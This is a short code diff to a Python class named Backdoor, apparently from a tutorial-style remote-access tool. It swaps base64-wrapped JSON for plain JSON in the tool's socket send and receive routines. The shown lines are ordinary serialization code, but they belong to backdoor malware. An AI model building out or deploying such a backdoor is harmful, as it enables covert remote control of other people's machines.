@@ -13,10 +13,7 @@ class Backdoor:
     
     def reliable_send(self, data):
         # Safety way to send data as json
-        '''
-        data is list so we have to data -> json (serialization) and next json -> base64 beacuse it is safer way to send data and in last episode base64->json bcs in this way we can use try to wait until whole data program recive in reliable_receive
-        '''
-        json_data = json.dumps(base64.b64encode(json.dumps(data).encode()).decode())
+        json_data = json.dumps(data)
         self.connection.send(json_data.encode())
 
     def reliable_receive(self):
@@ -25,7 +22,7 @@ class Backdoor:
         while True:
             try:
                 json_data += self.connection.recv(1024).decode()
-                return json.loads(base64.b64decode(json.loads(json_data)).decode())
+                return json.loads(json_data)
             except ValueError:
                 continue
     
